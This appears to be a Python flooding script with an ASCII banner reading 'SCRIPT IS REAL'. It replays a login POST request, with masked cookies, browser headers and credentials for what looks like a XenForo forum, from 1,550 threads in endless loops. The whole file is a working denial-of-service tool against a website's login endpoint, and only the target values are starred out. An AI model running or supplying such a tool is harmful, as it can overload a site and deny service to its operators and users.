import requests
import threading

#▄▄███▄▄· ██████╗██████╗ ██╗██████╗ ████████╗    ██╗███████╗    ██████╗ ███████╗ █████╗ ██╗     
#██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝    ██║██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║     
#███████╗██║     ██████╔╝██║██████╔╝   ██║       ██║███████╗    ██████╔╝█████╗  ███████║██║     
#╚════██║██║     ██╔══██╗╚═╝██╔═══╝    ██║       ╚═╝╚════██║    ██╔══██╗██╔══╝  ██╔══██║██║     
#███████║╚██████╗██║  ██║██╗██║        ██║       ██╗███████║    ██║  ██║███████╗██║  ██║███████╗
#╚═▀▀▀══╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝       ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                              
cookies = {
    'xf_csrf': '***********************',
    'xf_session': '********************',
}

headers = {
    'authority': '*********************',
    'accept': '************************',
    'accept-language': '***************',
    'cache-control': '*****************',
    # Requests sorts cookies= alphabetically
    'cookie': '************************',
    'origin': '************************',
    'referer': '***********************',
    'sec-fetch-dest': '****************',
    'sec-fetch-mode': '****************',
    'sec-fetch-site': '****************',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
}

data = {
    '_xfToken': '******************************',
    'login': '*********************************',
    'password': '******************************',
    'remember': '1',
    '_xfRedirect': 'https://***************.com/',
}

def script():
    while True:
        response = requests.post('https://***************', cookies=cookies, headers=headers, data=data).text

        print(response)
threads = []

for i in range(1550):
    t = threading.Thread(target=script)
    t.daemon = True
    threads.append(t)

for i in range(1550):
    threads[i].start()

for i in range(1550):
    threads[i].join()
